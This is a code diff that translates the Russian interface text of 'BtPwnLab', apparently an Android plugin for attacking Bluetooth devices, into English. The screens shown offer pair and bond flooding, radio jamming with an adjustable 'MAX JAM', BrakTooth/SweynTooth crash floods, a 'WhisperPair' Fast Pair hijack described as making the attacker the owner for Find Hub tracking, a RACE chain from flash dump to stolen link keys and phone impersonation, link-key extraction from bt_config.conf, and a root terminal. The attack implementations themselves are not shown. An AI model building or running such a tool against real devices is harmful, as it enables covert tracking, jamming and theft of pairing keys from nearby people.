-                    ui.text("Имя устройства", "titleLarge"),
-                    ui.text(_pick_name(d) or "не отдано в эфире",
+                    ui.text("Device name", "titleLarge"),
+                    ui.text(_pick_name(d) or "not advertised over the air",
                             "titleMedium" if _pick_name(d) else "bodyMedium"),
-                    ui.text("Источник: %s" % ("эфир/кэш" if _pick_name(d) else "—"),
+                    ui.text("Source: %s" % ("air/cache" if _pick_name(d) else "—"),
                             "bodySmall"),
                     ui.row([
-                        ui.button("Прочитать имя (GATT)", self.read_name),
-                        ui.button("Копировать MAC", self.copy_mac),
+                        ui.button("Read name (GATT)", self.read_name),
+                        ui.button("Copy MAC", self.copy_mac),
                     ], spacing=8),
-                    ui.text("Читаю Device Information 0x180A → Device Name 0x2A00. "
-                            "После этого Android кэширует имя и оно появится в сканах.",
+                    ui.text("Reads Device Information 0x180A → Device Name 0x2A00. "
+                            "Android then caches the name and it will appear in scans.",
                             "bodySmall"),
                 ]),
                 ui.segmented_list([
-                    ui.settings_row("Вендор", d.get("vendor", "?"), "business"),
-                    ui.settings_row("Чип", chip, "memory"),
-                    ui.settings_row("Модель (GATT)", d.get("model") or "-", "devices"),
-                    ui.settings_row("Производитель (GATT)", d.get("manuf") or "-",
+                    ui.settings_row("Vendor", d.get("vendor", "?"), "business"),
+                    ui.settings_row("Chip", chip, "memory"),
+                    ui.settings_row("Model (GATT)", d.get("model") or "-", "devices"),
+                    ui.settings_row("Manufacturer (GATT)", d.get("manuf") or "-",
                                     "factory"),
-                    ui.settings_row("Connectable", "да" if d.get("connectable") else "нет",
+                    ui.settings_row("Connectable", "yes" if d.get("connectable") else "no",
                                     "link"),
                     ui.settings_row("TX power", str(d.get("txPower", 0)) + " dBm", "sensors"),
-                    ui.settings_row("RACE", "да" if d.get("race") else "нет", "memory"),
-                    ui.settings_row("FastPair", "да" if d.get("fp") else "нет", "earbuds"),
-                    ui.settings_row("Тип рекламы", str(d.get("advertisementType", "?")),
+                    ui.settings_row("RACE", "yes" if d.get("race") else "no", "memory"),
+                    ui.settings_row("FastPair", "yes" if d.get("fp") else "no", "earbuds"),
+                    ui.settings_row("Advertisement type", str(d.get("advertisementType", "?")),
                                     "sensors"),
                 ]),
-                ui.text("Уязвимости", "titleMedium"),
+                ui.text("Vulnerabilities", "titleMedium"),
                 ui.segmented_list(vrows),
                 ui.card([
-                    ui.text("Сервисы", "titleMedium"),
+                    ui.text("Services", "titleMedium"),
                     ui.log_panel("\n".join([str(x) for x in (d.get("serviceUuids") or [])])
-                                 or "нет", 120),
+                                 or "none", 120),
                 ]),
                 ui.card([
                     ui.text("Raw advertisement", "titleMedium"),
-                    ui.log_panel(str(d.get("raw", "нет")), 140),
+                    ui.log_panel(str(d.get("raw", "none")), 140),
                 ]),
                 ui.row([
                     ui.button("Pair flood", self.pair_flood),
@@ -1688,15 +1688,15 @@ class BtPwnLab(BasePlugin):
         if not rows:
             rows.append(ui.card([
                 ui.icon("bug_report", 42),
-                ui.text("Оценка не запускалась", "titleMedium"),
-                ui.text("Сначала просканируй эфир, потом нажми «Оценить всё».", "bodyMedium"),
+                ui.text("Assessment not run yet", "titleMedium"),
+                ui.text("Scan the air first, then tap «Assess all».", "bodyMedium"),
             ]))
         return ui.scaffold(
-            title="Уязвимости",
+            title="Vulnerabilities",
             content=ui.lazy_column([
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
-                ui.button("Оценить всё", self.assess_all, fill_max_width=True),
-                ui.text("%d записей · база %d CVE" % (len(self.vuln_results), len(VULNDB)),
+                ui.button("Assess all", self.assess_all, fill_max_width=True),
+                ui.text("%d records · database %d CVEs" % (len(self.vuln_results), len(VULNDB)),
                         "titleMedium"),
                 ui.segmented_list(rows),
             ], padding=16, spacing=12, fill_max_size=True),
@@ -1708,22 +1708,22 @@ class BtPwnLab(BasePlugin):
             content=ui.lazy_column([
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
                 ui.card([
-                    ui.text("Режим", "titleLarge"),
+                    ui.text("Mode", "titleLarge"),
                     ui.button_group(
                         [["lescan", "LE"], ["inq", "Inquiry"],
                          ["feature", "V4"], ["classic", "Classic"],
                          ["iscan", "iscan"], ["reset", "reset"]],
                         self.jam_mode, self.set_jam_mode),
-                    ui.text("root: %s · тулзы: %s"
-                            % (self.root_ok, ", ".join(sorted(self.tools.keys())) or "нет"),
+                    ui.text("root: %s · tools: %s"
+                            % (self.root_ok, ", ".join(sorted(self.tools.keys())) or "none"),
                             "bodySmall"),
-                    ui.button("Стоп" if self.jam_running else "Старт",
+                    ui.button("Stop" if self.jam_running else "Start",
                               self.jam_stop if self.jam_running else self.jam_start,
                               fill_max_width=True),
                 ]),
                 ui.card([
                     ui.text("BrakTooth / SweynTooth", "titleLarge"),
-                    ui.text("Работает по выбранному устройству из Scanner → details.",
+                    ui.text("Works on the device selected in Scanner → details.",
                             "bodySmall"),
                     ui.button("Inquiry flood (V4/V5/V7/V8/V12)",
                               lambda: self.braktooth("inq"), fill_max_width=True),
@@ -1734,15 +1734,15 @@ class BtPwnLab(BasePlugin):
                     ui.text("Adapter", "titleLarge"),
                     ui.button("hciconfig -a", self.show_adapter, fill_max_width=True),
                 ]),
-                ui.button("MAX JAM (усиленный)", self.open_max, fill_max_width=True),
-                ui.button("Открыть Dolphy Jammer", self.open_dolphy_jammer,
+                ui.button("MAX JAM (enhanced)", self.open_max, fill_max_width=True),
+                ui.button("Open Dolphy Jammer", self.open_dolphy_jammer,
                           fill_max_width=True),
             ], padding=16, spacing=12, fill_max_size=True),
         )
 
     def screen_max(self, ui, api, state):
         d = self.selected or {}
-        tgt = _dev_label(d) if self.selected else "— не выбрано (режим: список) —"
+        tgt = _dev_label(d) if self.selected else "— nothing selected (mode: list) —"
         chips = [ui.chip("%s" % k, v, on_click=(lambda kk=k: self.toggle_vec(kk)))
                  for k, v in self.vec.items()]
         return ui.scaffold(
@@ -1750,44 +1750,44 @@ class BtPwnLab(BasePlugin):
             content=ui.lazy_column([
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
                 ui.card([
-                    ui.text("Цель", "labelLarge"),
+                    ui.text("Target", "labelLarge"),
                     ui.text(tgt, "titleMedium"),
                     ui.text(d.get("address") or "", "bodySmall"),
                     ui.text(self.vec_summary(), "bodySmall"),
                     ui.row([
-                        ui.chip("выбранное", self.target_mode == "selected",
+                        ui.chip("selected", self.target_mode == "selected",
                                 on_click=lambda: self.set_target_mode("selected")),
-                        ui.chip("весь список", self.target_mode == "list",
+                        ui.chip("whole list", self.target_mode == "list",
                                 on_click=lambda: self.set_target_mode("list")),
                     ], spacing=6),
-                    ui.text("тулзы: %s" % (", ".join(sorted(self.tools.keys())) or "нет"),
+                    ui.text("tools: %s" % (", ".join(sorted(self.tools.keys())) or "none"),
                             "bodySmall"),
                 ]),
                 ui.card([
-                    ui.text("Мощность", "titleLarge"),
+                    ui.text("Power", "titleLarge"),
                     ui.slider(self.intensity, self.set_intensity, 1, 24,
-                              "RFCOMM-потоки: %d" % self.intensity),
+                              "RFCOMM threads: %d" % self.intensity),
                     ui.slider(self.delay, self.set_delay, 0.02, 2.0,
-                              "Задержка: %.2f s" % self.delay),
-                    ui.button("СТОП MAX" if self.max_running else "СТАРТ MAX",
+                              "Delay: %.2f s" % self.delay),
+                    ui.button("STOP MAX" if self.max_running else "START MAX",
                               self.jam_max_stop if self.max_running else self.jam_max_start,
                               fill_max_width=True),
                 ]),
                 ui.card([
-                    ui.text("Векторы (тап — вкл/выкл)", "titleLarge"),
+                    ui.text("Vectors (tap to toggle)", "titleLarge"),
                     ui.row(chips, spacing=6),
-                    ui.text("rfcomm=RFCOMM-цикл · sdp=пакеты RFCOMM · bond=bond spam · "
+                    ui.text("rfcomm=RFCOMM loop · sdp=RFCOMM packets · bond=bond spam · "
                             "inq=inquiry cycling · gatt=GATT churn · name=btSetName · "
                             "ble=BLE adv · root=hcitool/btmgmt · "
-                            "stack=disable/enable стека + force-stop", "bodySmall"),
+                            "stack=stack disable/enable + force-stop", "bodySmall"),
                 ]),
                 ui.card([
-                    ui.text("Счётчики", "titleLarge"),
+                    ui.text("Counters", "titleLarge"),
                     ui.log_panel(self.stat_line(), 120),
-                    ui.text("stack рвёт все связи разом (радио уходит в off/on) — "
-                            "держи его отдельно, если нужен стабильный коннект.", "bodySmall"),
+                    ui.text("stack tears down every connection at once (radio goes off/on) -- "
+                            "keep it separate if you need a stable connection.", "bodySmall"),
                 ]),
-                ui.button("Лог", self.open_log, fill_max_width=True),
+                ui.button("Log", self.open_log, fill_max_width=True),
             ], padding=16, spacing=12, fill_max_size=True),
         )
 
@@ -1801,8 +1801,8 @@ class BtPwnLab(BasePlugin):
         if not rows:
             rows = [ui.card([
                 ui.icon("earbuds", 42),
-                ui.text("Fast Pair устройств нет в списке", "titleMedium"),
-                ui.text("Запусти скан на главном экране и включи фильтр FastPair.",
+                ui.text("No Fast Pair devices in the list", "titleMedium"),
+                ui.text("Run a scan on the main screen and enable the FastPair filter.",
                         "bodyMedium"),
             ])]
         return ui.scaffold(
@@ -1811,25 +1811,25 @@ class BtPwnLab(BasePlugin):
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
                 ui.card([
                     ui.text("CVE-2025-36911 · Google Fast Pair", "titleLarge"),
-                    ui.text("Аксессуар не проверяет pairing mode: seeker пишет "
-                            "KBP-запрос в 0xFE2C1234, затем добивает классическим "
-                            "bond. Среднее — 10 с, дистанция до 14 м. Account key "
-                            "в 0xFE2C1236 делает тебя владельцем (трекинг Find Hub).",
+                    ui.text("The accessory does not check pairing mode: the seeker writes "
+                            "a KBP request to 0xFE2C1234, then finishes with a classic "
+                            "bond. Average 10 s, range up to 14 m. The account key "
+                            "in 0xFE2C1236 makes you the owner (Find Hub tracking).",
                             "bodySmall"),
-                    ui.text("Цель: %s" % (_dev_label(d) if self.selected else "—"),
+                    ui.text("Target: %s" % (_dev_label(d) if self.selected else "—"),
                             "titleMedium"),
                     ui.row([
-                        ui.button("Атака WhisperPair", self.whisper_attack),
+                        ui.button("WhisperPair attack", self.whisper_attack),
                         ui.button("Bond spam", self.whisper_bond_spam),
                     ], spacing=8),
-                    ui.button("Открыть встроенный WhisperPair", self.open_dolphy_whisper,
+                    ui.button("Open built-in WhisperPair", self.open_dolphy_whisper,
                               fill_max_width=True),
                 ]),
-                ui.text("Fast Pair в эфире: %d" % len(fps), "titleMedium"),
+                ui.text("Fast Pair in the air: %d" % len(fps), "titleMedium"),
                 ui.segmented_list(rows),
                 ui.card([
-                    ui.text("Ход атаки", "titleLarge"),
-                    ui.log_panel("\n".join(self.whisper_log) or "не запускалось", 200),
+                    ui.text("Attack progress", "titleLarge"),
+                    ui.log_panel("\n".join(self.whisper_log) or "not run yet", 200),
                 ]),
             ], padding=16, spacing=12, fill_max_size=True),
         )
@@ -1842,42 +1842,42 @@ class BtPwnLab(BasePlugin):
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
                 ui.card([
                     ui.text("CVE-2025-20700 · 20701 · 20702", "titleLarge"),
-                    ui.text("RACE: GATT 5052494d-… / dc405470-… (BLE) и RFCOMM ch21 "
-                            "(Classic). Команды: build 0x1E08, bdaddr 0x0CD5, "
-                            "ram 0x1680/0x1681. Цепочка: dump flash → link key → "
-                            "импersonation телефона.", "bodySmall"),
-                    ui.text("Цель: %s" % (_dev_label(d) if self.selected else "—"),
+                    ui.text("RACE: GATT 5052494d-… / dc405470-… (BLE) and RFCOMM ch21 "
+                            "(Classic). Commands: build 0x1E08, bdaddr 0x0CD5, "
+                            "ram 0x1680/0x1681. Chain: dump flash → link key → "
+                            "phone impersonation.", "bodySmall"),
+                    ui.text("Target: %s" % (_dev_label(d) if self.selected else "—"),
                             "titleMedium"),
                     ui.button("RACE probe", self.race_probe, fill_max_width=True),
                 ]),
                 ui.card([
-                    ui.text("Ход пробы", "titleLarge"),
-                    ui.log_panel("\n".join(self.race_log) or "не запускалось", 260),
+                    ui.text("Probe progress", "titleLarge"),
+                    ui.log_panel("\n".join(self.race_log) or "not run yet", 260),
                 ]),
             ], padding=16, spacing=12, fill_max_size=True),
         )
 
     # ---------------------------------------------------------- ROOT LAB
     def screen_lab(self, ui, api, state):
-        tl = ", ".join(sorted(self.tools.keys())) or "не найдены"
+        tl = ", ".join(sorted(self.tools.keys())) or "not found"
         return ui.scaffold(
             title="Root Lab · A13",
             content=ui.lazy_column([
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
                 ui.card([
-                    ui.text("BT-стек", "titleLarge"),
-                    ui.text("cmd bluetooth_manager — штатный путь для 13-го билда",
+                    ui.text("BT stack", "titleLarge"),
+                    ui.text("cmd bluetooth_manager -- the official path on Android 13 builds",
                             "bodySmall"),
                     ui.row([
-                        ui.button("Состояние", self.lab_bt_state),
+                        ui.button("State", self.lab_bt_state),
                         ui.button("Toggle", self.lab_bt_toggle),
                         ui.button("Kill", self.lab_stack_kill),
                     ], spacing=8),
                 ]),
                 ui.card([
-                    ui.text("Захват трафика", "titleLarge"),
-                    ui.text("Снуп-лог: /data/misc/bluetooth/logs/btsnoop_hci.log "
-                            "(Wireshark). Offload off = чище захват.", "bodySmall"),
+                    ui.text("Traffic capture", "titleLarge"),
+                    ui.text("Snoop log: /data/misc/bluetooth/logs/btsnoop_hci.log "
+                            "(Wireshark). Offload off = cleaner capture.", "bodySmall"),
                     ui.row([
                         ui.button("Snoop ON", self.lab_snoop_on),
                         ui.button("Snoop OFF", self.lab_snoop_off),
@@ -1887,13 +1887,13 @@ class BtPwnLab(BasePlugin):
                         ui.button("Offload on", self.lab_offload_on),
                     ], spacing=8),
                     ui.row([
-                        ui.button("Pull лог", self.lab_pull_snoop),
+                        ui.button("Pull log", self.lab_pull_snoop),
                         ui.button("scan_always", self.lab_scan_always),
                     ], spacing=8),
                 ]),
                 ui.card([
-                    ui.text("Свойства и MAC", "titleLarge"),
-                    ui.text("resetprop -n правит даже ro.* в обход property_service.",
+                    ui.text("Props and MAC", "titleLarge"),
+                    ui.text("resetprop -n edits even ro.* bypassing property_service.",
                             "bodySmall"),
                     ui.row([
                         ui.button("Props", self.lab_props),
@@ -1901,14 +1901,14 @@ class BtPwnLab(BasePlugin):
                     ], spacing=8),
                     ui.row([
                         ui.button("MAC random", self.lab_mac_random),
-                        ui.button("GD-стек", self.lab_gd_stack),
+                        ui.button("GD stack", self.lab_gd_stack),
                     ], spacing=8),
                 ]),
                 ui.card([
-                    ui.text("Root-обвязка", "titleLarge"),
-                    ui.text("Тулзы: %s" % tl, "bodySmall"),
+                    ui.text("Root tooling", "titleLarge"),
+                    ui.text("Tools: %s" % tl, "bodySmall"),
                     ui.row([
-                        ui.button("Найти тулзы", self.lab_tools),
+                        ui.button("Find tools", self.lab_tools),
                         ui.button("Magisk", self.lab_magisk),
                     ], spacing=8),
                     ui.row([
@@ -1917,21 +1917,21 @@ class BtPwnLab(BasePlugin):
                     ], spacing=8),
                 ]),
                 ui.card([
-                    ui.text("Диагностика", "titleLarge"),
+                    ui.text("Diagnostics", "titleLarge"),
                     ui.row([
                         ui.button("dumpsys", self.lab_dumpsys),
                         ui.button("logcat BT", self.lab_logcat),
                     ], spacing=8),
-                    ui.button("Имена", self.lab_names, fill_max_width=True),
+                    ui.button("Names", self.lab_names, fill_max_width=True),
                 ]),
                 ui.card([
-                    ui.text("Вывод", "titleLarge"),
-                    ui.log_panel("\n".join(self.lab_log[-160:]) or "пусто", 300),
+                    ui.text("Output", "titleLarge"),
+                    ui.log_panel("\n".join(self.lab_log[-160:]) or "empty", 300),
                 ]),
             ], padding=16, spacing=12, fill_max_size=True),
         )
 
-    # ------------------------------------------------- v4.3: экран имён
+    # ------------------------------------------------- v4.3: names screen
     def screen_names(self, ui, api, state):
         named = [d for d in self.visible() if _pick_name(d)]
         rows = [ui.function_row(_dev_label(x),
@@ -1940,27 +1940,27 @@ class BtPwnLab(BasePlugin):
         if not rows:
             rows = [ui.card([
                 ui.icon("badge", 42),
-                ui.text("Имён пока нет", "titleMedium"),
-                ui.text("Имя появляется, если устройство его вещает, если оно есть "
-                        "в спаренных, или после «Прочитать имя» на карточке.",
+                ui.text("No names yet", "titleMedium"),
+                ui.text("A name appears if the device advertises it, if it is known "
+                        "from bonded devices, or after «Read name» on the card.",
                         "bodyMedium"),
             ])]
         return ui.scaffold(
-            title="Имена",
+            title="Names",
             content=ui.lazy_column([
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
                 ui.card([
-                    ui.text("Известных имён: %d" % len(self.known_names), "titleMedium"),
-                    ui.text("Спаренные и bt_config.conf подтягиваются автоматически.",
+                    ui.text("Known names: %d" % len(self.known_names), "titleMedium"),
+                    ui.text("Bonded devices and bt_config.conf are pulled in automatically.",
                             "bodySmall"),
-                    ui.button("Обновить список", self._refresh_known_names,
+                    ui.button("Refresh list", self._refresh_known_names,
                               fill_max_width=True),
                 ]),
-                ui.text("С именем: %d" % len(named), "titleMedium"),
+                ui.text("Named: %d" % len(named), "titleMedium"),
                 ui.segmented_list(rows),
                 ui.card([
-                    ui.text("Как получили имя", "titleLarge"),
-                    ui.log_panel("\n".join(self.name_log[-60:]) or "пусто", 200),
+                    ui.text("How the name was obtained", "titleLarge"),
+                    ui.log_panel("\n".join(self.name_log[-60:]) or "empty", 200),
                 ]),
             ], padding=16, spacing=12, fill_max_size=True),
         )
@@ -1975,13 +1975,13 @@ class BtPwnLab(BasePlugin):
         rows = [ui.settings_row(r["name"], "%s · %s" % (r["mac"], r["key"][:24]), "vpn_key")
                 for r in self.keys_rows]
         if not rows:
-            rows = [ui.settings_row("Нет данных", "нажми «Читать»", "info")]
+            rows = [ui.settings_row("No data", "tap «Read»", "info")]
         return ui.scaffold(
             title="Link Keys",
             content=ui.lazy_column([
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
-                ui.button("Читать bt_config.conf", self.load_keys, fill_max_width=True),
-                ui.text("%d записей" % len(self.keys_rows), "titleMedium"),
+                ui.button("Read bt_config.conf", self.load_keys, fill_max_width=True),
+                ui.text("%d records" % len(self.keys_rows), "titleMedium"),
                 ui.segmented_list(rows),
             ], padding=16, spacing=12, fill_max_size=True),
         )
@@ -1994,7 +1994,7 @@ class BtPwnLab(BasePlugin):
             content=ui.lazy_column([
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
                 ui.card([
-                    ui.text_field(self.term_cmd, self.term_set, "команда"),
+                    ui.text_field(self.term_cmd, self.term_set, "command"),
                     ui.row([
                         ui.chip("root" if self.term_root else "shell",
                                 self.term_root,
@@ -2003,28 +2003,28 @@ class BtPwnLab(BasePlugin):
                         ui.text("root: %s" % self.root_ok, "bodySmall"),
                     ], spacing=8),
                     ui.row([
-                        ui.button("Выполнить", self.term_run),
-                        ui.button("Очистить", self.term_clear),
+                        ui.button("Run", self.term_run),
+                        ui.button("Clear", self.term_clear),
                     ], spacing=8),
                 ]),
                 ui.card([
-                    ui.text("Быстрые", "titleLarge"),
+                    ui.text("Quick", "titleLarge"),
                     ui.row(quicks, spacing=6),
                 ]),
-                ui.log_panel("\n".join(self.term_lines[-300:]) or "пусто", 380),
+                ui.log_panel("\n".join(self.term_lines[-300:]) or "empty", 380),
             ], padding=16, spacing=12, fill_max_size=True),
         )
 
     def screen_log(self, ui, api, state):
         return ui.scaffold(
-            title="Лог",
+            title="Log",
             content=ui.lazy_column([
                 ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
-                ui.log_panel("\n".join(self.log_lines[-200:]) or "пусто", 420),
+                ui.log_panel("\n".join(self.log_lines[-200:]) or "empty", 420),
             ], padding=16, spacing=12, fill_max_size=True),
         )
 
-    # ============================================ HOOК-ПАНЕЛИ
+    # ============================================ HOOK PANELS
     def screen_whisper_panel(self, ui, api, state):
         d = self.selected or {}
         return ui.card([
@@ -2032,12 +2032,12 @@ class BtPwnLab(BasePlugin):
                 ui.icon("earbuds", 30),
                 ui.column([
                     ui.text("BT PWN Lab · WhisperPair", "titleMedium"),
-                    ui.text("CVE-2025-36911 · цель: %s"
+                    ui.text("CVE-2025-36911 · target: %s"
                             % (_dev_label(d) if self.selected else "—"), "bodySmall"),
                 ], spacing=2),
             ], spacing=10),
             ui.row([
-                ui.button("Атака", self.whisper_attack),
+                ui.button("Attack", self.whisper_attack),
                 ui.button("Bond spam", self.whisper_bond_spam),
                 ui.icon_button("terminal", self.open_term),
             ], spacing=8),
